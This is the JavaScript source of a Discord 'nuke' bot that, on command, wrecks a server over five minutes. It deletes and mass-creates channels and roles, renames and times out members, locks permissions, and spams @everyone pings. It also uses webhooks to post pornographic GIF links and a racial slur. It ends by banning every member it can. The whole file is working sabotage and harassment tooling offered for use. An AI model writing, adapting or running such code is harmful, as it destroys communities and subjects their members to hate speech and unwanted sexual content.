require('dotenv').config();
const { Client, GatewayIntentBits, ChannelType, PermissionFlagsBits, Colors } = require('discord.js');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildVoiceStates,
    GatewayIntentBits.GuildModeration,
  ],
});

// ================== CONFIG ==================
const TOKEN = process.env.TOKEN;
const TARGET_GUILD_ID = process.env.TARGET_GUILD_ID || null;
const PROTECTED_CHANNEL = 'aaaaaaaa';

const NUKE_DURATION = 5 * 60 * 1000;      // 5 minutes
const TICK_INTERVAL = 3 * 1000;           // much faster (3s)
const FINAL_TIMEOUT = 28 * 24 * 60 * 60 * 1000; // 28 days

let nukeActive = false;
let nukeInterval = null;
let nukeTimeout = null;

// ================== GIF SLOTS ==================
const GIF_TYPE_1 = [
  "https://klipy.com/gifs/orgasm-cumming-1"
];

const GIF_TYPE_2 = [
  "https://klipy.com/gifs/vegan-porn-carrot-porn"
];

// ================== LISTS ==================
const SERVER_NAMES = [
  'NUKED', 'OP NUKE', 'SERVER DEAD', 'OWNED', 'RIP', 'GET FUCKED',
  'NO SURVIVORS', 'BOT WON', 'DESTROYED', 'GOODBYE', 'MINIONS ACTIVE',
  'REALITY BROKEN', 'CHAOS OVERLOAD', 'TOTAL COLLAPSE', 'FINAL STAGE',
  'NO ESCAPE', 'WEBHOOK ARMY', 'ARMY ONLINE', 'BOSS RAGE', 'FULL AGGRO',
  'MULTI TASK', 'PARALLEL CHAOS', '5X OP', 'OVERPOWERED'
];

const CHANNEL_NAMES = [
  'nuked', 'destroyed', 'owned', 'rip', 'get-fucked', 'dead', 'chaos', 'void',
  'pain', 'end', 'lmao', 'gg', 'bot-was-here', 'no-escape', 'server-corpse',
  'extreme-nuke', 'minion-zone', 'hallucination', 'glitch', 'error', 'deleted',
  'why', 'mute-zone', 'screaming', 'help', 'pain-chamber', 'final',
  'minion-spam', 'boss-room', 'collapse', 'broken', 'army', 'flood', 'wave',
  'aggro', 'rage', 'kill', 'multi', 'parallel', 'pressure', 'op', '5x'
];

const NICKNAMES = [
  'NUKED', 'OWNED', 'RIP', 'GET FUCKED', 'BOT PROPERTY', 'NO HOPE',
  'DESTROYED', 'SERVER CORPSE', 'VICTIM', 'MINION FOOD', 'MUTED',
  'SILENCED', 'BROKEN', 'ARMY TARGET', 'WEBHOOK VICTIM', 'BOSS TARGET',
  'RAGE VICTIM', 'AGGRO', 'MULTI VICTIM', 'PRESSURED', 'OP VICTIM'
];

const ROLE_NAMES = [
  'Nuked', 'Owned', 'Destroyed', 'RIP', 'Bot Property', 'No Hope', 'Minion',
  'Glitch', 'Muted', 'Silenced', 'Chaos', 'Victim', 'Army', 'Flooded',
  'Boss Marked', 'Rage', 'Aggro', 'Doomed', 'Parallel', 'Pressure', 'OP'
];

const MESSAGES = [
`@everyone`,`@here`
];

const ARMY_NAMES = [
  'Minion', 'Army-1', 'Army-2', 'Flood', 'Screamer', 'Null', 'Hunter',
  'Breaker', 'Spammer', 'Ghost', 'Drone', 'Wave', 'Chaos', 'Destroyer',
  'Pain', 'Void', 'Error', 'Slave', 'Glitch', 'Overlord', 'Rage', 'Aggro',
  'OP-1', 'OP-2', 'OP-3'
];

const ARMY_MESSAGES = [
  `@everyone`,`@here`
];

// ================== HELPERS ==================
function randomItem(arr) {
  if (!arr || arr.length === 0) return null;
  return arr[Math.floor(Math.random() * arr.length)];
}

function chance(percent) {
  return Math.random() * 100 < percent;
}

async function getOrCreateWebhook(channel, name = 'Minion') {
  try {
    const webhooks = await channel.fetchWebhooks();
    let webhook = webhooks.find(wh => wh.name === name);
    if (!webhook) {
      webhook = await channel.createWebhook({
        name: name,
        reason: 'OP Webhook Army',
      });
    }
    return webhook;
  } catch (err) {
    return null;
  }
}

async function safeDelete(channel) {
  if (!channel || channel.name === PROTECTED_CHANNEL) return;
  await channel.delete('5X OP NUKE').catch(() => {});
}

// ================== FINAL BAN WAVE ==================
async function finalBanWave(guild) {
  console.log('🔪 FINAL BAN WAVE STARTING...');

  const members = await guild.members.fetch().catch(() => null);
  if (!members) return;

  let banned = 0;
  let timedOut = 0;
  let failed = 0;

  const tasks = [...members.values()].map(async (member) => {
    if (member.user.bot) return;
    if (member.id === guild.ownerId) return;

    try {
      if (member.bannable) {
        await member.ban({ reason: '5X OP NUKE - FINAL WAVE' });
        banned++;
        return;
      }
    } catch (e) {}

    try {
      if (member.moderatable) {
        await member.timeout(FINAL_TIMEOUT, '5X OP NUKE - FALLBACK');
        timedOut++;
        return;
      }
    } catch (e) {}

    failed++;
  });

  await Promise.all(tasks);
  console.log(`✅ FINAL WAVE → Banned: ${banned} | Timed out: ${timedOut} | Failed: ${failed}`);
}

// ================== BOSS ACTIONS (5X) ==================
const bossActions = [
  async (guild) => {
    await guild.setName(randomItem(SERVER_NAMES)).catch(() => {});
  },

  async (guild) => {
    const channels = [...guild.channels.cache.values()];
    await Promise.all(channels.map(ch => safeDelete(ch)));
  },

  async (guild) => {
    const tasks = [];
    for (let i = 0; i < 15; i++) {
      tasks.push(
        guild.channels.create({
          name: randomItem(CHANNEL_NAMES),
          type: ChannelType.GuildText,
        }).then(ch => ch.send(randomItem(MESSAGES)).catch(() => {})).catch(() => {})
      );
    }
    await Promise.all(tasks);
  },

  async (guild) => {
    const tasks = [];
    for (let i = 0; i < 9; i++) {
      tasks.push(
        guild.channels.create({
          name: randomItem(['temp', 'flash', 'glitch', 'rage', 'aggro', 'op', 'kill']),
          type: ChannelType.GuildText,
        }).then(async ch => {
          await ch.send('👁').catch(() => {});
          setTimeout(() => ch.delete().catch(() => {}), 1500 + Math.random() * 2500);
        }).catch(() => {})
      );
    }
    await Promise.all(tasks);
  },

  async (guild) => {
    const roles = [...guild.roles.cache.values()];
    await Promise.all(
      roles
        .filter(r => r.id !== guild.id && r.editable)
        .map(r => r.delete('5X OP NUKE').catch(() => {}))
    );
  },

  async (guild) => {
    const tasks = [];
    for (let i = 0; i < 12; i++) {
      tasks.push(
        guild.roles.create({
          name: randomItem(ROLE_NAMES),
          color: randomItem([Colors.Red, Colors.DarkRed, Colors.Purple, Colors.Orange, Colors.Fuchsia]),
          reason: '5X OP NUKE',
        }).catch(() => {})
      );
    }
    await Promise.all(tasks);
  },

  async (guild) => {
    const members = await guild.members.fetch().catch(() => null);
    if (!members) return;
    await Promise.all(
      [...members.values()]
        .filter(m => !m.user.bot && m.manageable)
        .map(m => m.setNickname(randomItem(NICKNAMES)).catch(() => {}))
    );
  },

  async (guild) => {
    const members = await guild.members.fetch().catch(() => null);
    if (!members) return;
    await Promise.all(
      [...members.values()]
        .filter(m => !m.user.bot && m.moderatable)
        .map(m => {
          const time = [1800, 3600, 7200, 14400, 28800][Math.floor(Math.random() * 5)] * 1000;
          return m.timeout(time, '5X OP NUKE').catch(() => {});
        })
    );
  },

  async (guild) => {
    const channels = guild.channels.cache.filter(c =>
      c.type === ChannelType.GuildText &&
      c.permissionsFor(guild.members.me)?.has(PermissionFlagsBits.SendMessages)
    );
    const tasks = [];
    for (const channel of channels.values()) {
      for (let i = 0; i < 8; i++) {
        tasks.push(channel.send(randomItem(MESSAGES)).catch(() => {}));
      }
    }
    await Promise.all(tasks);
  },

  async (guild) => {
    const channels = guild.channels.cache.filter(c => c.manageable);
    await Promise.all(
      [...channels.values()].map(channel =>
        channel.permissionOverwrites.edit(guild.roles.everyone, {
          ViewChannel: chance(5),
          SendMessages: false,
          Connect: false,
          Speak: false,
          AddReactions: false,
          AttachFiles: false,
          EmbedLinks: false,
        }).catch(() => {})
      )
    );
  },

  async (guild) => {
    await guild.members.me.setNickname(randomItem([
      '5X OP NUKE', 'OVERPOWERED', 'PARALLEL CHAOS', 'BOSS RAGE',
      'ARMY COMMANDER', 'OVERLORD', 'THE DESTROYER'
    ])).catch(() => {});
  },

  async (guild) => {
    const members = await guild.members.fetch().catch(() => null);
    const roles = [...guild.roles.cache.filter(r => r.editable && r.id !== guild.id).values()];
    if (!members || roles.length === 0) return;

    await Promise.all(
      [...members.values()]
        .filter(m => !m.user.bot && m.manageable)
        .map(m => {
          const role = randomItem(roles);
          return role ? m.roles.add(role).catch(() => {}) : Promise.resolve();
        })
    );
  },
];

// ================== WEBHOOK ARMY (5X) ==================
const armyActions = [
  async (guild) => {
    const channels = guild.channels.cache.filter(c =>
      c.type === ChannelType.GuildText &&
      c.permissionsFor(guild.members.me)?.has(PermissionFlagsBits.ManageWebhooks)
    );

    const tasks = [];
    for (const channel of channels.values()) {
      for (const name of ARMY_NAMES.slice(0, 12)) {
        tasks.push((async () => {
          const webhook = await getOrCreateWebhook(channel, name);
          if (!webhook) return;
          for (let i = 0; i < 4; i++) {
            const gif = Math.random() < 0.5 ? randomItem(GIF_TYPE_1) : randomItem(GIF_TYPE_2);
            await webhook.send({
              content: gif || randomItem(ARMY_MESSAGES),
              username: name,
            }).catch(() => {});
          }
        })());
      }
    }
    await Promise.all(tasks);
  },

  async (guild) => {
    const channels = guild.channels.cache.filter(c =>
      c.type === ChannelType.GuildText &&
      c.permissionsFor(guild.members.me)?.has(PermissionFlagsBits.ManageWebhooks)
    );

    const tasks = [];
    for (const channel of channels.values()) {
      for (let i = 0; i < 8; i++) {
        tasks.push((async () => {
          const webhook = await getOrCreateWebhook(channel, randomItem(ARMY_NAMES));
          if (!webhook) return;
          await webhook.send({
            content: randomItem(ARMY_MESSAGES),
            username: randomItem(ARMY_NAMES),
          }).catch(() => {});
        })());
      }
    }
    await Promise.all(tasks);
  },

  async (guild) => {
    const tasks = [];
    for (let i = 0; i < 6; i++) {
      tasks.push((async () => {
        try {
          const ch = await guild.channels.create({
            name: randomItem(['army-spam', 'op-wave', 'flood-zone', 'aggro', '5x']),
            type: ChannelType.GuildText,
          });
          for (const name of ARMY_NAMES.slice(0, 5)) {
            const webhook = await getOrCreateWebhook(ch, name);
            if (!webhook) continue;
            const gif = Math.random() < 0.5 ? randomItem(GIF_TYPE_1) : randomItem(GIF_TYPE_2);
            await webhook.send({
              content: gif || randomItem(ARMY_MESSAGES),
              username: name,
            }).catch(() => {});
          }
        } catch (e) {}
      })());
    }
    await Promise.all(tasks);
  },

  async (guild) => {
    const channels = guild.channels.cache.filter(c => c.type === ChannelType.GuildText);
    const tasks = [];
    for (const channel of channels.values()) {
      tasks.push((async () => {
        const webhook = await getOrCreateWebhook(channel, 'Glitch');
        if (!webhook) return;
        await webhook.send({
          content: randomItem([`FUCK NIGGERS`]),
          username: randomItem(['Glitch', 'Null', 'Error', 'Void', 'Rage']),
        }).catch(() => {});
      })());
    }
    await Promise.all(tasks);
  },
];

// ================== TICK ==================
async function runNukeTick(guild) {
  if (!guild || !guild.members.me.permissions.has(PermissionFlagsBits.Administrator)) return;

  console.log(`\n======== 5X OP TICK on ${guild.name} ========`);

  const selectedBoss = [...bossActions].sort(() => 0.5 - Math.random()).slice(0, 11);
  const selectedArmy = [...armyActions].sort(() => 0.5 - Math.random()).slice(0, 5);

  await Promise.all([
    ...selectedBoss.map(a => a(guild).catch(e => console.error('❌ Boss:', e.message))),
    ...selectedArmy.map(a => a(guild).catch(e => console.error('❌ Army:', e.message))),
  ]);
}

// ================== START / STOP ==================
async function startNuke(guild, message) {
  if (nukeActive) {
    if (message) await message.reply('⚠️ Nuke already running.');
    return;
  }

  nukeActive = true;
  if (message) await message.reply('💣 **5X OP NUKE STARTED**\n5 minutes of chaos → then ban wave.');

  console.log('💣 5X OP NUKE STARTED');

  await runNukeTick(guild);

  nukeInterval = setInterval(async () => {
    if (!nukeActive) return clearInterval(nukeInterval);
    await runNukeTick(guild);
  }, TICK_INTERVAL);

  nukeTimeout = setTimeout(async () => {
    nukeActive = false;
    clearInterval(nukeInterval);
    console.log('⏰ 5 MINUTES OVER → FINAL BAN WAVE');
    await finalBanWave(guild);
    console.log('🛑 5X OP NUKE FULLY ENDED');
  }, NUKE_DURATION);
}

// ================== EVENTS ==================
client.once('ready', () => {
  console.log(`✅ Logged in as ${client.user.tag}`);
  console.log(`💣 5X OP NUKE BOT READY`);
});

client.on('messageCreate', async (message) => {
  if (message.author.bot || !message.guild) return;
  if (!message.member.permissions.has(PermissionFlagsBits.Administrator)) return;

  if (message.content === '!nuke') {
    await startNuke(message.guild, message);
  }

  if (message.content === '!nuke-stop') {
    nukeActive = false;
    if (nukeInterval) clearInterval(nukeInterval);
    if (nukeTimeout) clearTimeout(nukeTimeout);
    await message.reply('🛑 Nuke stopped early.');
  }
});

client.login(TOKEN);
